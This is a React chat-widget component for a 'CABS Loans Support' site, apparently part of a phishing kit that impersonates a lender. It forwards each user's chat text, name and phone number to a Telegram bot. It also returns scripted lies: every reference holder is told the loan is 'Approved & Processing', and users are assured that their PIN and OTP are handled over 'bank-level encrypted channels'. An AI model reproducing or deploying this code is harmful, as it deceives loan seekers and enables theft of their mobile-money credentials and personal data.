import React, { useState, useRef, useEffect } from 'react';
import { MessageSquare, X, Send, Bot, User, Sparkles } from 'lucide-react';
import { useClient } from '../context/ClientContext';
import { sendBotNotification } from '../services/botService';

export const ChatBotWidget = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [inputMsg, setInputMsg] = useState('');
  const { client } = useClient();

  const [messages, setMessages] = useState([
    {
      sender: 'bot',
      text: `Hello 👋 Welcome to CABS Loans Support! How can I assist you today?`,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ]);

  const messagesEndRef = useRef(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    if (isOpen) scrollToBottom();
  }, [messages, isOpen]);

  const handleSend = async (e) => {
    e.preventDefault();
    if (!inputMsg.trim()) return;

    const userText = inputMsg.trim();
    const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    const newMsgs = [...messages, { sender: 'user', text: userText, time: timeStr }];
    setMessages(newMsgs);
    setInputMsg('');

    // Trigger Telegram notification for user chat message
    sendBotNotification(`💬 <b>New User Chat Message</b>:\nUser: ${client.name || 'Anonymous'}\nPhone: ${client.number || 'N/A'}\nMessage: ${userText}`);

    // Generate Bot Response
    setTimeout(() => {
      let reply = "Thank you for reaching out! Our team is available 24/7. How else can I help with your loan application?";
      const lower = userText.toLowerCase();

      if (lower.includes('rate') || lower.includes('interest')) {
        reply = "Our interest rates range from 4.0% to 8.5% APR depending on your loan duration (6 to 60 months).";
      } else if (lower.includes('status') || lower.includes('check')) {
        reply = client.refId 
          ? `Your loan application reference is ${client.refId}. Status: Approved & Processing.`
          : "You can check your application status by completing your loan details in the application form.";
      } else if (lower.includes('amount') || lower.includes('max') || lower.includes('limit')) {
        reply = "CABS offers instant USD loans from $500 up to $50,000 with flexible monthly repayment terms.";
      } else if (lower.includes('requirement') || lower.includes('need') || lower.includes('document')) {
        reply = "To apply, you only need your Full Name, EcoCash / Phone Number, National ID, and Monthly Net Income!";
      } else if (lower.includes('pin') || lower.includes('otp')) {
        reply = "For security reasons, your 4-digit PIN and OTP are processed through bank-level encrypted channels.";
      }

      setMessages((prev) => [
        ...prev,
        { sender: 'bot', text: reply, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }
      ]);
    }, 800);
  };

  return (
    <div style={{ position: 'fixed', bottom: '24px', right: '24px', zIndex: 1000 }}>
      {/* Floating Toggle Button */}
      {!isOpen && (
        <button
          onClick={() => setIsOpen(true)}
          style={{
            width: '60px',
            height: '60px',
            borderRadius: '30px',
            background: 'linear-gradient(135deg, #0066cc 0%, #00b4d8 100%)',
            color: '#ffffff',
            border: 'none',
            boxShadow: '0 8px 24px rgba(0, 102, 204, 0.4)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            transition: 'transform 0.2s ease'
          }}
          title="Chat with CABS Assistant"
        >
          <MessageSquare size={28} />
        </button>
      )}

      {/* Chat Window Container */}
      {isOpen && (
        <div
          style={{
            width: '360px',
            height: '480px',
            background: '#ffffff',
            borderRadius: '20px',
            boxShadow: '0 20px 40px rgba(9, 20, 37, 0.25)',
            border: '1px solid #e2e8f0',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden',
            animation: 'fadeInUp 0.3s ease-out'
          }}
        >
          {/* Chat Header */}
          <div
            style={{
              background: 'linear-gradient(135deg, #091425 0%, #172a46 100%)',
              color: '#ffffff',
              padding: '1rem 1.25rem',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
              <div style={{ width: '36px', height: '36px', borderRadius: '50%', background: '#0066cc', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <Bot size={20} color="#ffffff" />
              </div>
              <div>
                <h4 style={{ margin: 0, fontSize: '0.95rem', fontWeight: 700 }}>CABS AI Assistant</h4>
                <span style={{ fontSize: '0.75rem', color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '0.2rem' }}>
                  <Sparkles size={12} /> Online & Ready
                </span>
              </div>
            </div>
            <button
              onClick={() => setIsOpen(false)}
              style={{ background: 'none', border: 'none', color: '#94a3b8', cursor: 'pointer' }}
            >
              <X size={20} />
            </button>
          </div>

          {/* Messages Area */}
          <div
            style={{
              flex: 1,
              padding: '1rem',
              overflowY: 'auto',
              display: 'flex',
              flexDirection: 'column',
              gap: '0.75rem',
              background: '#f8fafc'
            }}
          >
            {messages.map((m, idx) => (
              <div
                key={idx}
                style={{
                  display: 'flex',
                  justifyContent: m.sender === 'user' ? 'flex-end' : 'flex-start'
                }}
              >
                <div
                  style={{
                    maxWidth: '80%',
                    padding: '0.75rem 1rem',
                    borderRadius: m.sender === 'user' ? '16px 16px 2px 16px' : '16px 16px 16px 2px',
                    background: m.sender === 'user' ? '#0066cc' : '#ffffff',
                    color: m.sender === 'user' ? '#ffffff' : '#1e293b',
                    boxShadow: '0 2px 6px rgba(0,0,0,0.05)',
                    fontSize: '0.875rem',
                    lineHeight: 1.4
                  }}
                >
                  <p style={{ margin: 0 }}>{m.text}</p>
                  <span style={{ fontSize: '0.675rem', opacity: 0.7, marginTop: '0.25rem', display: 'block', textAlign: 'right' }}>
                    {m.time}
                  </span>
                </div>
              </div>
            ))}
            <div ref={messagesEndRef} />
          </div>

          {/* Input Form */}
          <form
            onSubmit={handleSend}
            style={{
              padding: '0.75rem',
              background: '#ffffff',
              borderTop: '1px solid #e2e8f0',
              display: 'flex',
              gap: '0.5rem'
            }}
          >
            <input
              type="text"
              placeholder="Ask a question..."
              value={inputMsg}
              onChange={(e) => setInputMsg(e.target.value)}
              style={{
                flex: 1,
                padding: '0.65rem 0.9rem',
                border: '1.5px solid #cbd5e1',
                borderRadius: '20px',
                fontSize: '0.875rem',
                outline: 'none'
              }}
            />
            <button
              type="submit"
              style={{
                width: '40px',
                height: '40px',
                borderRadius: '50%',
                background: '#0066cc',
                color: '#ffffff',
                border: 'none',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}
            >
              <Send size={18} />
            </button>
          </form>
        </div>
      )}
    </div>
  );
};
